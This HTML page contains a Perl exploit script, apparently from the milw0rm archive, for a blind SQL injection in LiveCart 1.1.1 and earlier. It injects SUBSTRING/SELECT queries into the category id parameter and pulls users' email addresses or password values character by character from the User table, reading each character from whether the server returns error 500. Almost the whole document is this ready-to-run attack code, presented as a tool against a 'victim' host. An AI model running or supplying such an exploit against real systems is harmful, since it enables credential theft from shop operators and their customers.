<html><head><title>LiveCart <= 1.1.1 (category id) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
use LWP::UserAgent;
#-----------------------------------------------------------------------------------------------#
# scripts       : livecart Remote Blind Sql Injection						#
# scripts site  : http://www.livecart.com							#
#												#
# Discovered											#
# By 		: irvian									#
# site		: http://irvian.cn								#
# forum		: http://noscan.info/forum							#
# email		: irvian.info@gmail.com								#
#												#
# Thanks To											#
# friend	: str0ke, nyubi, ibnusina, arioo, jipank, ifx, karet, bluespy and all my friend #
#-----------------------------------------------------------------------------------------------#
# sample 	: 										#
# http://demo.livecart.com									#
#-----------------------------------------------------------------------------------------------#
print &quot;\r\n[+]----------------------[+]\r\n&quot;;
print &quot;[+]Blind SQL injection	 [+]\r\n&quot;;
print &quot;[+]Livecart              [+]\r\n&quot;;
print &quot;[+]code by irvian	 [+]\r\n&quot;;
print &quot;[+]irvian[dot]cn 	 [+]\r\n&quot;;
print &quot;[+]----------------------[+]\n\r&quot;;
if (@ARGV &lt; 3){
die &quot;
Cara Mengunakan : perl $0 host option userid

Keterangan
host	: http://victim.com atau victim.com
Option	: pilih 1 untuk mencari email dan pilih 2 untuk mencari password
userid	: Limit
Contoh	: perl $0 http://victim.com 1 1
\n&quot;;}


$url = $ARGV[0];
$option = $ARGV[1];
$id = $ARGV[2];

if ($option eq 1){
syswrite(STDOUT, &quot;email: &quot;, 7);}
elsif ($option eq 2){
syswrite(STDOUT, &quot;password: &quot;, 10);}

for($i = 1; $i &lt;= 32; $i++){
 $f = 0;
 $n = 32;
 while(!$f &amp;&amp; $n &lt;= 57)
 {
  if(&amp;blind($url, $option, $id, $i, $n, $id)){
  $f = 1;
     syswrite(STDOUT, chr($n), 1);
   }
$n++;
}
if ($f==0){
$n = 97;
 while(!$f &amp;&amp; $n &lt;= 122)
 {
  if(&amp;blind($url, $option, $id, $i, $n, $id)){
  $f = 1;
     syswrite(STDOUT, chr($n), 1);
   }
$n++;
}
}
}

print &quot;\n[+]finish Execution Exploit\n&quot;;



sub blind {
my $site = $_[0];
my $op = $_[1];
my $id = $_[2];
my $i = $_[3];
my $n = $_[4];
my $r = $_[5];
if ($op eq 1){$klm = &quot;email&quot;;}
elsif ($op eq 2){$klm = &quot;password&quot;;}
$site =~ s/^http:\/\///;
my $url = &quot;http://&quot;.&quot;$site&quot;.&quot;/category?id=1&quot;.&quot;%20AND%20SUBSTRING((SELECT%20&quot;.&quot;$klm&quot;.&quot;%20FROM%20&quot;.&quot;User&quot;.&quot;%20LIMIT%20&quot;.&quot;$r&quot;.&quot;,1&quot;.&quot;),&quot;.&quot;$i&quot;.&quot;,1)=CHAR(&quot;.&quot;$n&quot;.&quot;)&quot;;
my $browser = &amp;zero($url);

if ($browser !~ /Error Code 500/gi){
	return 1;
}
else {
return 0;
}
}

sub zero($){
my $spy = $_[0];
my $ua = LWP::UserAgent-&gt;new;
$ua-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
my $res =  $ua-&gt;get($spy);
my @r = $res-&gt;content;
$page=&quot;@r&quot;;
return $page;}

# milw0rm.com [2008-04-10]</pre></html>